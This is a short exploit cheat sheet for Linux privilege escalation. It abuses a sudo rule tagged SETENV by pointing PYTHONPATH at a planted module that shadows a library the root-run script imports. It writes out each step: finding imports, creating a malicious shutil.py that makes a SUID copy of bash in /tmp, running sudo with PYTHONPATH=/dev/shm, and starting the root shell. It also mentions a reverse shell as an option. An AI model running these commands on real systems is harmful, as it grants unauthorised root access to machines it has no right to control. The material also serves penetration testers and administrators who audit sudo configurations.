# sudo SETENV PYTHONPATH Library Hijack

When `sudo` is configured with the `SETENV` tag for a command, the caller can pass environment variables inline (bypassing `env_reset`). If the script imports a Python library by name, setting `PYTHONPATH` to a directory containing a malicious module of the same name gives code execution as root.

## Check sudo -l

```
User <user> may run the following commands:
  (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

The `SETENV` tag allows passing environment variables when calling sudo.

## Identify Python Library Imports in Script

```bash
grep -i import /opt/scripts/admin_tasks.sh
# Look for: python3 /opt/scripts/some_backup.py
# Then: grep import /opt/scripts/some_backup.py
# e.g.: import shutil
```

## Create Malicious Module

```bash
# Create malicious shutil.py in /dev/shm
cat > /dev/shm/shutil.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")
EOF
```

## Exploit

```bash
# Run sudo command with PYTHONPATH pointing to malicious module directory
sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh

# Execute SUID bash
/tmp/rootbash -p
# or get reverse shell
```

## Notes
- `secure_path` prevents PATH manipulation, but PYTHONPATH is not restricted the same way
- `PYTHONPATH` cannot be passed via `-E`; must be passed as `sudo VAR=val command`
- The script must import Python and use the hijackable library before the shell command runs
- Common targets: `shutil`, `hashlib`, `os`, `subprocess` — any module the script imports
